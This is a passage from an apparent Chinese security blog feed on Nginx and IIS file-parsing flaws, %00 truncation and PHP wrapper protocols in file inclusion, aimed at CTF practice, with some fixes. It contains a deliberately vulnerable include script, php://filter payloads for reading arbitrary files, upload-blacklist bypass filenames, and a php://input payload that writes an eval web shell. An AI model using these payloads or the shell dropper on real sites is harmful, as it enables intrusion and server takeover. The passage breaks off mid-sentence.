class="line"></span><br><span class="line">**恶意用户发出请求`http://example.com/file.ext％00.php`就会将file.ext作为PHP文件解析。**</span><br><span class="line"></span><br><span class="line">**如果一个攻击者可以控制文件的内容（即：使用头像上传形式）其结果是执行任意代码。Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码。**</span><br><span class="line"></span><br><span class="line">### 修复</span><br><span class="line"></span><br><span class="line">**1.禁止在上传文件目录下执行php。**</span><br><span class="line">**在nginx虚拟机配置或者fcgi.conf配置加如下代码**</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">if ($request_filename ~* (.*)\.php) &#123;</span><br><span class="line">    set $php_url $1;</span><br><span class="line">&#125;</span><br><span class="line">if (!-e $php_url.php) &#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre></li></ul><p><strong>2.升级到最新版本的nginx</strong></p><h2 id="IIS5-x-6-x解析漏洞"><a href="#IIS5-x-6-x解析漏洞" class="headerlink" title="IIS5.x-6.x解析漏洞"></a>IIS5.x-6.x解析漏洞</h2><p><strong>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语言一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</strong></p><h3 id="目录解析-6-0"><a href="#目录解析-6-0" class="headerlink" title="目录解析(6.0)"></a>目录解析(6.0)</h3><p><strong>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a></strong><br><strong>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</strong></p><h3 id="文件解析（6-0）"><a href="#文件解析（6-0）" class="headerlink" title="文件解析（6.0）"></a>文件解析（6.0）</h3><p>形式：<a href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a><br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p><h3 id="解析文件类型"><a href="#解析文件类型" class="headerlink" title="解析文件类型"></a>解析文件类型</h3><p>有的网站在上传检测中会用”黑名单”方法 ,但是IIS6.0 默认的可执行文件除了asp还包含这三种 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/test.asa</span><br><span class="line">/test.cer</span><br><span class="line">/test.cdx</span><br></pre></td></tr></table></figure><p><strong>iis为什么会把asa，cdx，cer解析成asp文件：原因是这四种扩展名都是用的同一个asp.dll文件来执行。</strong><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-95eb3257c442fb58.png" alt="图片.png"></p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p><strong>1.目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传<code>xx.asp;.jpg</code>类型的文件名。<br>2.做好权限设置，限制用户创建文件夹。</strong></p><h2 id="IIS7-5解析漏洞"><a href="#IIS7-5解析漏洞" class="headerlink" title="IIS7.5解析漏洞"></a>IIS7.5解析漏洞</h2><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。<br><strong>跟nginx解析漏洞一样，要在php.ini cgi.fix_pathinfo&#x3D;1 开启的情况才会产生。</strong></p><p>可以配合操作系统文件命名规则，上传不符合windows文件命名规则的文件名</p><blockquote><p>test.asp.<br>test.asp(空格)<br>test.php:1.jpg<br>test.php:: $DATA # php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名</p></blockquote><p><strong>会被windows系统自动去掉不符合规则符号后面的内，然后再配合这个解析漏洞来执行文件。</strong></p><h2 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h2><p>条件：php 版本&lt;5.3.4</p><ul><li>filename&#x3D;test.php%00.txt</li><li>1.上传时路径可控，使用00截断</li><li>2.文件下载时，00截断绕过白名单检查</li><li>3.文件包含时，00截断后面限制(主要是本地包含时)</li><li>4.其它与文件操作有关的地方都可能使用00截断。</li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><strong>在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，</strong></p><p><strong>若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。</strong></p><p><strong>这种方法可以配合文件解析漏洞从而产生更大的杀伤力。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP Protocols and File Inclusion Vulnerabilities</title>
      <link href="/2020/05/25/PHP-Protocols-and-File-Inclusion-Vulnerabilities/"/>
      <url>/2020/05/25/PHP-Protocols-and-File-Inclusion-Vulnerabilities/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-PHP伪协议"><a href="#0x01-PHP伪协议" class="headerlink" title="0x01 PHP伪协议"></a>0x01 PHP伪协议</h2><p>PHP伪协议事实上是其支持的协议与封装协议，会多次出现在CTFweb题中，并且有很多妙用。</p><p>PHP中支持的协议种类一共有12种:<br><a href="https://www.php.net/manual/zh/wrappers.file.php">file</a>、<a href="https://www.php.net/manual/zh/wrappers.http.php">http</a>、<a href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp</a>、<a href="https://www.php.net/manual/zh/wrappers.php.php">php</a>、<a href="https://www.php.net/manual/zh/wrappers.zlib.php">zlib</a>、<a href="https://www.php.net/manual/zh/wrappers.data.php">data</a>、<a href="https://www.php.net/manual/zh/wrappers.glob.php">glob</a>、<a href="https://www.php.net/manual/zh/wrappers.phar.php">phar</a>、<a href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2</a>、<a href="https://www.php.net/manual/zh/wrappers.rar.php">rar</a>、<a href="https://www.php.net/manual/zh/wrappers.ogg.php">ogg</a>、<a href="https://www.php.net/manual/zh/wrappers.expect.php">expect</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">//    — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">//    — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">//     — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">//     — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">//    — 压缩流</span></span><br><span class="line">data:<span class="comment">//    — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">//    — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">//    — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">//    — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">//     — RAR</span></span><br><span class="line">ogg:<span class="comment">//     — 音频流</span></span><br><span class="line">expect:<span class="comment">//  — 处理交互式的流</span></span><br></pre></td></tr></table></figure><h3 id="0x001-file-协议"><a href="#0x001-file-协议" class="headerlink" title="0x001 file:&#x2F;&#x2F;协议"></a>0x001 file:&#x2F;&#x2F;协议</h3><p>PHP.ini：</p><p><strong>file:&#x2F;&#x2F; 协议在双off的情况下也可以正常使用:</strong></p><blockquote><p>allow_url_fopen ：off&#x2F;on</p><p>allow_url_include：off&#x2F;on</p></blockquote><p><strong>file:&#x2F;&#x2F; 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</strong></p><p><strong>实例</strong></p><p>新建cmd.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$page</span>))&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><p><em>file:&#x2F;&#x2F;{文件的绝对路径和文件名}</em></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=file://E:/phpStudy/WWW/phpinfo.php</span><br></pre></td></tr></table></figure><p>即可读取.</p><h3 id="0x002-php-协议"><a href="#0x002-php-协议" class="headerlink" title="0x002 php:&#x2F;&#x2F;协议"></a>0x002 php:&#x2F;&#x2F;协议</h3><p>条件：</p><blockquote><p>不需要开启allow_url_fopen</p><p>仅php:&#x2F;&#x2F;input、 php:&#x2F;&#x2F;stdin、 php:&#x2F;&#x2F;memory 和 php:&#x2F;&#x2F;temp 需要开启allow_url_include。</p></blockquote><p>应用：</p><blockquote><p>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams）</p><p>在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input</p><p>php:&#x2F;&#x2F;filter用于读取源码</p><p>php:&#x2F;&#x2F;input用于执行php代码</p></blockquote><p><code>php://stdin</code>是只读的</p><p><code>php://stdout</code> 和 <code>php://stderr</code> 是只写的。</p><h4 id="php-stdin"><a href="#php-stdin" class="headerlink" title="php:&#x2F;&#x2F;stdin"></a>php:&#x2F;&#x2F;stdin</h4><p>打开一个文件指针进行读取<code>fopen(&#39;php://stdin&#39;,&#39;r&#39;)</code></p><h4 id="php-stdout"><a href="#php-stdout" class="headerlink" title="php:&#x2F;&#x2F;stdout"></a>php:&#x2F;&#x2F;stdout</h4><p>打开一个文件指针进行写入<code>fopen(&#39;php://stdout&#39;, &#39;w&#39;);</code></p><h4 id="php-stderr"><a href="#php-stderr" class="headerlink" title="php:&#x2F;&#x2F;stderr"></a>php:&#x2F;&#x2F;stderr</h4><p>打开一个文件指针进行写入<code> fopen( &#39;php://stderr&#39;, &#39;w&#39; );</code></p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p><strong>注:</strong></p><p><strong>php:&#x2F;&#x2F;filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</strong></p><p>PHP.ini：</p><p>php:&#x2F;&#x2F;filter在双off的情况下也可以正常使用；</p><blockquote><p>allow_url_fopen ：off&#x2F;on</p><p>allow_url_include：off&#x2F;on</p></blockquote><p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">resource&#x3D;&lt;要过滤的数据流&gt;</td><td align="center">这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td align="center">read&#x3D;&lt;读链的筛选列表&gt;</td><td align="center">该参数可选。可以设定一个或多个过滤器名称，以管道符 （ | ）分隔。</td></tr><tr><td align="center">write&#x3D;&lt;写链的筛选列表&gt;</td><td align="center">该参数可选。可以设定一个或多个过滤器名称，以管道符（ | ）分隔。</td></tr><tr><td align="center">&lt;;两个链的筛选列表&gt;</td><td align="center">任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p><strong>可以运用多种过滤器（字符串&#x2F;转换&#x2F;压缩&#x2F;加密）</strong><br>例如平时我们用来<strong>任意文件读取</strong>的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=upload.php</span></span><br><span class="line">这里读的过滤器为convert.base64-encode,把输入流进行base64编码</span><br><span class="line">resource=upload.php，代表读取upload.php的内容</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524161149988.png" alt="image-20200524161149988"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524161102548.png" alt="image-20200524161102548"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524162107743.png" alt="image-20200524162107743"></p><p><strong>灵活使用</strong></p><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;&lt;读取链需要应用的过滤器列表&gt;</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode|string.toupper|string.rot14/resource=phpinfo.php</span><br></pre></td></tr></table></figure><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p><strong>php:&#x2F;&#x2F;input可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</strong> </p><p><code>php://input</code> 是个可以访问请求的原始数据的只读流。因为它不依赖于特定的 <code>php.ini</code> 指令。<br><strong>注：enctype&#x3D;”multipart&#x2F;form-data” 的时候 <code>php://input</code> 是无效的。</strong></p><p><strong>PHP.ini：</strong></p><blockquote><p>allow_url_fopen ：off&#x2F;on</p><p>allow_url_include：on</p></blockquote><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://lab.l0ki.top/cmd.php?file=php://input</span><br><span class="line">同时POST：file=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524193720261.png" alt="image-20200524193720261"></p><p>需要注意:</p><ul><li>测试过程中必须要开启allow_url_include，否则会报错</li><li>非测试状态下则需要关闭，否则造成任意代码执行</li></ul><p><strong>实战中也可以POST如下内容生成一句话：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(“shell.php”,”w”),’&lt;?php <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>];?&gt;’);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="php-output"><a href="#php-output" class="headerlink" title="php:&#x2F;&#x2F;output"></a>php:&#x2F;&#x2F;output</h4><p><code>php://output</code> 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lab.l0ki.top/read.php?file=php://output</span><br></pre></td></tr></table></figure><p>read.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$test</span>,<span class="string">&#x27;this is test&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524195724335.png" alt="image-20200524195724335"></p><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a><strong>过滤器</strong></h4><p>过滤器有很多种，有字符串过滤器、转换过滤器、压缩过滤器、加密过滤器</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">string.rot13</td><td align="center">进行rot13转换</td></tr><tr><td align="center">string.toupper</td><td align="center">将字符全部大写</td></tr><tr><td align="center">string.tolower</td><td align="center">将字符全部小写</td></tr><tr><td align="center">string.strip_tags</td><td align="center">去除空字符、HTML 和 PHP 标记后的结果，</td></tr><tr><td align="center">功能类似于strip_tags()函数，若不想某些字符不被消除，后面跟上字符，可利用字符串或是数组两种方式</td><td align="center"></td></tr></tbody></table><p><strong>举例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.rot13&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;rot13:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.toupper&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upper:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.tolower&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Lower:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Del1:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.strip_tags&#x27;</span>, STREAM_FILTER_WRITE);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;&lt;b&gt;This is a test.&lt;/b&gt;!!!!&lt;h1&gt;~~~~&lt;/h1&gt;\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Del2:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.strip_tags&#x27;</span>, STREAM_FILTER_WRITE, <span class="string">&quot;&lt;b&gt;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;&lt;b&gt;This is a test.&lt;/b&gt;!!!!&lt;h1&gt;~~~~&lt;/h1&gt;\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.strip_tags&#x27;</span>, STREAM_FILTER_WRITE, <span class="keyword">array</span>(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;h1&#x27;</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Del3:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;&lt;b&gt;This is a test.&lt;/b&gt;!!!!&lt;h1&gt;~~~~&lt;/h1&gt;\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524200557962.png" alt="image-20200524200557962"></p><h4 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h4><p><strong>convert.base64-encode &amp; convert.base64-decode</strong></p><blockquote><p>base64 编码解码<br>convert.base64-encode和convert.base64-decode使用这两个过滤器等同于分别用 base64_encode()和 base64_decode()函数处理所有的流数据。 convert.base64-encode支持以一个关联数组给出的参数。如果给出了line-length，base64 输出将被用 line-length个字符为长度而截成块。如果给出了 line-break-chars，每块将被用给出的字符隔开。这些参数的效果和用 base64_encode()再加上 chunk_split()相同。</p></blockquote><p>**convert.quoted-printable-encode &amp; convert.quoted-printable-decode **</p><blockquote><p>quoted-printable 编码解码<br>convert.quoted-printable-encode和 convert.quoted-printable-decode等同于用 quoted_printable_decode()函数处理所有的流数据。没有和 convert.quoted-printable-encode相对应的函数。 convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和 convert.base64-encode一样的附加参数外，convert.quoted-printable-encode还支持布尔参数 binary和 force-encode-first。 convert.base64-decode只支持 line-break-chars参数作为从编码载荷中剥离的类型提示。</p></blockquote><p><strong>举例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.base64-encode&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;base64-encode:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$param</span> = <span class="keyword">array</span>(<span class="string">&#x27;line-length&#x27;</span> =&gt; <span class="number">8</span>, <span class="string">&#x27;line-break-chars&#x27;</span> =&gt; <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.base64-encode&#x27;</span>, STREAM_FILTER_WRITE, <span class="variable">$param</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\nbase64-encode-split:\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.base64-decode&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\nbase64-decode:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;VGhpcyBpcyBhIHRlc3QuCg==\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.quoted-printable-encode&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;quoted-printable-encode:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.quoted-printable-decode&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\nquoted-printable-decode:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.=0A&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524201145738.png" alt="image-20200524201145738"></p><h4 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h4><p><strong>zlib.deflate和 zlib.inflate</strong></p><blockquote><p>zlib.deflate（压缩）和 zlib.inflate（解压）实现了定义与 » RFC 1951的压缩算法。 deflate过滤器可以接受以一个关联数组传递的最多三个参数。 level定义了压缩强度（1-9）。数字更高通常会产生更小的载荷，但要消耗更多的处理时间。存在两个特殊压缩等级：0（完全不压缩）和 -1（zlib 内部默认值，目前是 6）。 window是压缩回溯窗口大小，以二的次方表示。更高的值（大到 15 —— 32768 字节）产生更好的压缩效果但消耗更多内存，低的值（低到 9 —— 512 字节）产生产生较差的压缩效果但内存消耗低。目前默认的 window大小是 15。 memory用来指示要分配多少工作内存。合法的数值范围是从 1（最小分配）到 9（最大分配）。内存分配仅影响速度，不会影响生成的载荷的大小。<br>Note: 